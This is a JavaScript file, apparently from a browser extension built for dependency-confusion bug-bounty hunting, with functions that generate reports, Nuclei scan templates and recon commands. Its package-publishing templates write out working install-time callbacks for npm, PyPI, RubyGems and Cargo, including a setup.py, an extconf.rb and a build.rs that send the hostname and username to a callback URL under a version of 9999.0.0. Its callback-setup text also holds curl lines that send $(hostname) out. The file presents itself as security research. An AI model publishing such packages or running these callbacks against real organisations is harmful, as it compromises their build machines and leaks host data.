// Generate report for a finding
function generateFindingReport(finding) {
  if (!finding) {
    showNotification('Finding not found', 'error');
    return;
  }

  chrome.runtime.sendMessage({
    action: 'generateFindingReport',
    finding: finding
  }, (response) => {
    if (response && response.success) {
      showReportModal(finding.package, response.report, 'finding');
    } else {
      showNotification('Failed to generate report', 'error');
    }
  });
}

// Show report modal
function showReportModal(packageName, reportContent, type) {
  const existingModal = document.getElementById('reportModal');
  if (existingModal) {
    existingModal.remove();
  }

  const modal = document.createElement('div');
  modal.id = 'reportModal';
  modal.className = 'poc-modal';
  modal.innerHTML = `
    <div class="poc-modal-content" style="max-width: 600px;">
      <div class="poc-modal-header">
        <h3>📝 Report: ${escapeHtml(packageName)}</h3>
        <button class="poc-modal-close">&times;</button>
      </div>
      <div class="poc-modal-body">
        <div class="poc-section">
          <h4>${type === 'callback' ? '✅ Confirmed Vulnerability' : '⚠️ Potential Vulnerability'}</h4>
          <p style="font-size: 12px; color: #888; margin-bottom: 10px;">
            ${type === 'callback'
              ? 'This report contains evidence of successful exploitation.'
              : 'This report is for a potential vulnerability not yet confirmed.'}
          </p>
        </div>

        <div class="poc-section">
          <h4>📄 Markdown Report</h4>
          <pre class="poc-code" style="max-height: 300px;"><code>${escapeHtml(reportContent)}</code></pre>
        </div>

        <div class="poc-actions" style="gap: 8px;">
          <button class="btn btn-primary btn-copy-report">📋 Copy Report</button>
          <button class="btn btn-secondary btn-download-report">📥 Download .md</button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Event listeners
  modal.querySelector('.poc-modal-close').addEventListener('click', () => modal.remove());
  modal.addEventListener('click', (e) => {
    if (e.target === modal) modal.remove();
  });

  // Copy report
  modal.querySelector('.btn-copy-report').addEventListener('click', () => {
    navigator.clipboard.writeText(reportContent).then(() => {
      showNotification('Report copied!', 'success');
    });
  });

  // Download report
  modal.querySelector('.btn-download-report').addEventListener('click', () => {
    const filename = `dependency-confusion-report-${packageName}-${Date.now()}.md`;
    downloadFile(filename, reportContent);
    showNotification('Report downloaded!', 'success');
  });
}

// Helper function to download a file
function downloadFile(filename, content) {
  const blob = new Blob([content], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

// ============================================
// Tools Tab Functions
// ============================================

function setupToolsTab() {
  // Confused tool
  const generateConfusedBtn = document.getElementById('generateConfusedCmd');
  const copyConfusedBtn = document.getElementById('copyConfusedCmd');
  const confusedEcosystem = document.getElementById('confusedEcosystem');
  const confusedFile = document.getElementById('confusedFile');

  if (generateConfusedBtn) {
    generateConfusedBtn.addEventListener('click', () => generateConfusedCommand());
  }
  if (copyConfusedBtn) {
    copyConfusedBtn.addEventListener('click', () => copyToolOutput('confusedOutput'));
  }
  if (confusedEcosystem) {
    confusedEcosystem.addEventListener('change', () => {
      const eco = confusedEcosystem.value;
      const fileMap = {
        'npm': 'package.json',
        'pip': 'requirements.txt',
        'rubygems': 'Gemfile.lock',
        'composer': 'composer.json',
        'maven': 'pom.xml'
      };
      if (confusedFile) confusedFile.value = fileMap[eco] || 'package.json';
      generateConfusedCommand();
    });
  }

  // Nuclei template
  const generateNucleiBtn = document.getElementById('generateNucleiTemplate');
  const copyNucleiBtn = document.getElementById('copyNucleiTemplate');
  const downloadNucleiBtn = document.getElementById('downloadNucleiTemplate');

  if (generateNucleiBtn) {
    generateNucleiBtn.addEventListener('click', () => generateNucleiTemplate());
  }
  if (copyNucleiBtn) {
    copyNucleiBtn.addEventListener('click', () => copyToolOutput('nucleiOutput'));
  }
  if (downloadNucleiBtn) {
    downloadNucleiBtn.addEventListener('click', () => downloadNucleiTemplateFile());
  }

  // Callback server tabs
  document.querySelectorAll('.tool-tab[data-callback]').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tool-tab[data-callback]').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      updateCallbackServerOutput(tab.dataset.callback);
    });
  });

  const copyCallbackBtn = document.getElementById('copyCallbackSetup');
  if (copyCallbackBtn) {
    copyCallbackBtn.addEventListener('click', () => copyToolOutput('callbackServerOutput'));
  }

  // ghorg
  const generateGhorgBtn = document.getElementById('generateGhorgCmd');
  const copyGhorgBtn = document.getElementById('copyGhorgCmd');

  if (generateGhorgBtn) {
    generateGhorgBtn.addEventListener('click', () => generateGhorgCommand());
  }
  if (copyGhorgBtn) {
    copyGhorgBtn.addEventListener('click', () => copyToolOutput('ghorgOutput'));
  }

  // Package publishing
  const generatePublishBtn = document.getElementById('generatePublishCmd');
  const copyPublishBtn = document.getElementById('copyPublishCmd');
  const publishEcosystem = document.getElementById('publishEcosystem');

  if (generatePublishBtn) {
    generatePublishBtn.addEventListener('click', () => generatePublishCommand());
  }
  if (copyPublishBtn) {
    copyPublishBtn.addEventListener('click', () => copyToolOutput('publishOutput'));
  }
  if (publishEcosystem) {
    publishEcosystem.addEventListener('change', () => generatePublishCommand());
  }
}

function generateConfusedCommand() {
  const ecosystem = document.getElementById('confusedEcosystem')?.value || 'npm';
  const file = document.getElementById('confusedFile')?.value || 'package.json';

  const commands = `# Install confused (requires Go)
go install github.com/visma-prodsec/confused@latest

# Or download from releases
# wget https://github.com/visma-prodsec/confused/releases/latest/download/confused_linux_amd64

# Run scanner on local file
confused -l ${ecosystem} ${file}

# Run scanner from URL
# wget https://target.com/${file}
# confused -l ${ecosystem} ${file}

# Supported: npm, pip, rubygems, composer, maven, gradle`;

  const output = document.getElementById('confusedOutput');
  if (output) {
    output.innerHTML = `<code>${escapeHtml(commands)}</code>`;
  }
  showNotification('Command generated!', 'success');
}

function generateNucleiTemplate() {
  const target = document.getElementById('nucleiTarget')?.value || 'https://example.com';

  const template = `id: dependency-confusion-scan

info:
  name: Dependency Confusion - Exposed Package Files
  author: OFJAAAH
  severity: medium
  description: Scans for exposed dependency files that may reveal internal package names
  tags: dependency-confusion,exposure,config

http:
  - method: GET
    path:
      - "{{BaseURL}}/package.json"
      - "{{BaseURL}}/package-lock.json"
      - "{{BaseURL}}/yarn.lock"
      - "{{BaseURL}}/npm-shrinkwrap.json"
      - "{{BaseURL}}/requirements.txt"
      - "{{BaseURL}}/Pipfile"
      - "{{BaseURL}}/Pipfile.lock"
      - "{{BaseURL}}/setup.py"
      - "{{BaseURL}}/Gemfile"
      - "{{BaseURL}}/Gemfile.lock"
      - "{{BaseURL}}/composer.json"
      - "{{BaseURL}}/composer.lock"
      - "{{BaseURL}}/go.mod"
      - "{{BaseURL}}/go.sum"
      - "{{BaseURL}}/Cargo.toml"
      - "{{BaseURL}}/Cargo.lock"
      - "{{BaseURL}}/pom.xml"
      - "{{BaseURL}}/build.gradle"
      - "{{BaseURL}}/.npmrc"
      - "{{BaseURL}}/.pypirc"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - '"dependencies"'
          - '"devDependencies"'
          - '"peerDependencies"'
          - 'require('
          - 'gem '
          - 'source "https://rubygems.org"'
          - '[packages]'
          - 'module '
          - '[dependencies]'
        condition: or

      - type: regex
        regex:
          - '"@[a-z0-9-]+/[a-z0-9-]+"'
          - 'registry.npmjs.org'
          - 'pypi.org'
          - 'rubygems.org'

    extractors:
      - type: regex
        name: npm-packages
        regex:
          - '"(@?[a-z0-9-]+(/[a-z0-9-]+)?)"\\s*:'
        group: 1

# Usage:
# nuclei -t dependency-confusion-scan.yaml -u ${target}
# nuclei -t dependency-confusion-scan.yaml -l targets.txt`;

  const output = document.getElementById('nucleiOutput');
  if (output) {
    output.innerHTML = `<code id="nucleiTemplateCode">${escapeHtml(template)}</code>`;
  }
  showNotification('Full template generated!', 'success');
}

function downloadNucleiTemplateFile() {
  const code = document.getElementById('nucleiTemplateCode');
  if (code) {
    const content = code.textContent;
    downloadFile('dependency-confusion-scan.yaml', content);
    showNotification('Template downloaded!', 'success');
  }
}

function updateCallbackServerOutput(server) {
  const outputs = {
    interactsh: `# Install Interactsh Client
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run client (generates unique OOB URL)
interactsh-client

# Example output:
# [INF] Listing 1 payload for OOB Testing
# [INF] c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro

# Use in your PoC callback:
# curl http://YOUR_UNIQUE_ID.oast.pro?pkg=\${PACKAGE_NAME}

# Self-hosted server (optional)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
interactsh-server -domain your-domain.com`,

    discord: `# Discord Webhook Setup

1. Go to your Discord server
2. Server Settings > Integrations > Webhooks
3. Create New Webhook
4. Copy Webhook URL

# Webhook URL format:
https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN

# Test webhook with curl:
curl -X POST -H "Content-Type: application/json" \\
  -d '{"content": "Test callback!", "embeds": [{"title": "Test", "color": 16711680}]}' \\
  "YOUR_WEBHOOK_URL"

# Configure in extension:
# Go to Settings > Discord Webhook > Paste URL`,

    pipedream: `# Pipedream Setup

1. Go to https://pipedream.com
2. Create free account
3. Create new workflow
4. Add HTTP trigger
5. Copy the unique URL

# URL format:
https://YOUR_ID.m.pipedream.net

# Test callback:
curl "https://YOUR_ID.m.pipedream.net?package=test&hostname=\$(hostname)"

# Benefits:
# - Free tier available
# - Real-time event logging
# - Webhook transformations
# - Integrations (Slack, Email, etc.)`
  };

  const output = document.getElementById('callbackServerOutput');
  if (output) {
    output.innerHTML = `<code>${escapeHtml(outputs[server] || outputs.interactsh)}</code>`;
  }
}

function generateGhorgCommand() {
  const org = document.getElementById('ghorgTarget')?.value || 'target-org';

  const commands = `# Install ghorg
go install github.com/gabrie30/ghorg@latest

# Configure GitHub token
export GHORG_GITHUB_TOKEN=YOUR_GITHUB_TOKEN

# Clone entire organization
ghorg clone ${org}

# Clone with specific options
ghorg clone ${org} --clone-type=org --scm=github

# Extract npm package names from cloned repos
find ~/ghorg/${org} -name "package.json" -exec cat {} \\; 2>/dev/null | \\
  jq -r '.dependencies // {} | keys[]' 2>/dev/null | sort -u > npm-packages.txt

# Extract Python packages
find ~/ghorg/${org} -name "requirements.txt" -exec cat {} \\; 2>/dev/null | \\
  grep -v "^#" | grep -v "^$" | cut -d'=' -f1 | cut -d'>' -f1 | cut -d'<' -f1 | \\
  sort -u > pip-packages.txt

# Extract Ruby gems
find ~/ghorg/${org} -name "Gemfile" -exec grep "gem " {} \\; 2>/dev/null | \\
  awk '{print $2}' | tr -d "'" | tr -d '"' | tr -d ',' | sort -u > ruby-gems.txt

# Extract Go modules
find ~/ghorg/${org} -name "go.mod" -exec grep -E "^\\s+[a-z]" {} \\; 2>/dev/null | \\
  awk '{print $1}' | sort -u > go-modules.txt

# Check packages against public registries
cat npm-packages.txt | xargs -I {} sh -c 'curl -s https://registry.npmjs.org/{} | jq -e .error && echo "{}"' 2>/dev/null > vulnerable-npm.txt`;

  const output = document.getElementById('ghorgOutput');
  if (output) {
    output.innerHTML = `<code>${escapeHtml(commands)}</code>`;
  }
  showNotification('Commands generated!', 'success');
}

function generatePublishCommand() {
  const packageName = document.getElementById('publishPackageName')?.value || 'your-package-name';
  const ecosystem = document.getElementById('publishEcosystem')?.value || 'npm';

  const commands = {
    npm: `# NPM Publishing Commands

# 1. Create package directory
mkdir ${packageName} && cd ${packageName}

# 2. Initialize package
npm init -y

# 3. Edit package.json - add preinstall script
# "scripts": {
#   "preinstall": "node callback.js"
# }

# 4. Create callback.js (see PoC generator)

# 5. Login to npm
npm login

# 6. Publish package
npm publish --access public

# 7. Verify publication
npm view ${packageName}

# 8. Unpublish (within 72 hours if needed)
npm unpublish ${packageName} --force`,

    pypi: `# PyPI Publishing Commands

# 1. Create package structure
mkdir -p ${packageName}/${packageName.replace(/-/g, '_')}
cd ${packageName}

# 2. Create setup.py with callback
cat > setup.py << 'EOF'
from setuptools import setup
import os
import socket
import urllib.request

# Callback during install
try:
    data = f"pkg=${packageName}&host={socket.gethostname()}&user={os.getenv('USER', 'unknown')}"
    urllib.request.urlopen(f"YOUR_CALLBACK_URL?{data}", timeout=5)
except: pass

setup(
    name="${packageName}",
    version="9999.0.0",
    packages=["${packageName.replace(/-/g, '_')}"],
)
EOF

# 3. Create __init__.py
echo "" > ${packageName.replace(/-/g, '_')}/__init__.py

# 4. Build package
pip install build twine
python -m build

# 5. Upload to TestPyPI first (recommended)
twine upload --repository testpypi dist/*

# 6. Upload to PyPI
twine upload dist/*`,

    rubygems: `# RubyGems Publishing Commands

# 1. Create gem structure
mkdir ${packageName} && cd ${packageName}

# 2. Create gemspec
cat > ${packageName}.gemspec << 'EOF'
Gem::Specification.new do |s|
  s.name        = "${packageName}"
  s.version     = "9999.0.0"
  s.summary     = "Security research package"
  s.authors     = ["Security Researcher"]
  s.files       = ["lib/${packageName}.rb"]
  s.extensions  = ["ext/extconf.rb"]
end
EOF

# 3. Create lib file
mkdir -p lib ext
echo "# ${packageName}" > lib/${packageName}.rb

# 4. Create extconf.rb (executes during install)
cat > ext/extconf.rb << 'EOF'
require 'net/http'
require 'socket'
begin
  uri = URI("YOUR_CALLBACK_URL?pkg=${packageName}&host=#{Socket.gethostname}")
  Net::HTTP.get(uri)
rescue; end
File.write("Makefile", "all:\\ninstall:\\n")
EOF

# 5. Build gem
gem build ${packageName}.gemspec

# 6. Push to RubyGems
gem push ${packageName}-9999.0.0.gem

# 7. Yank if needed
gem yank ${packageName} -v 9999.0.0`,

    cargo: `# Cargo (Rust) Publishing Commands

# 1. Create crate
cargo new ${packageName} --lib
cd ${packageName}

# 2. Edit Cargo.toml
cat > Cargo.toml << 'EOF'
[package]
name = "${packageName}"
version = "9999.0.0"
edition = "2021"
description = "Security research package"
license = "MIT"
repository = "https://github.com/your-repo/${packageName}"

[build-dependencies]
reqwest = { version = "0.11", features = ["blocking"] }
EOF

# 3. Create build.rs (executes during build)
cat > build.rs << 'EOF'
use std::env;
fn main() {
    if let Ok(client) = reqwest::blocking::Client::builder().build() {
        let host = hostname::get().unwrap_or_default().to_string_lossy().to_string();
        let url = format!("YOUR_CALLBACK_URL?pkg=${packageName}&host={}", host);
        let _ = client.get(&url).send();
    }
}
EOF

# 4. Login to crates.io
cargo login YOUR_API_TOKEN

# 5. Publish
cargo publish

# 6. Yank if needed
cargo yank --vers 9999.0.0 ${packageName}`
  };

  const output = document.getElementById('publishOutput');
  if (output) {
    output.innerHTML = `<code>${escapeHtml(commands[ecosystem] || commands.npm)}</code>`;
  }
  showNotification('Commands generated!', 'success');
}

function copyToolOutput(elementId) {
  const element = document.getElementById(elementId);
  if (element) {
    const code = element.querySelector('code');
    if (code) {
      navigator.clipboard.writeText(code.textContent).then(() => {
        showNotification('Copied to clipboard!', 'success');
      }).catch(() => {
        showNotification('Failed to copy', 'error');
      });
    }
  }
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
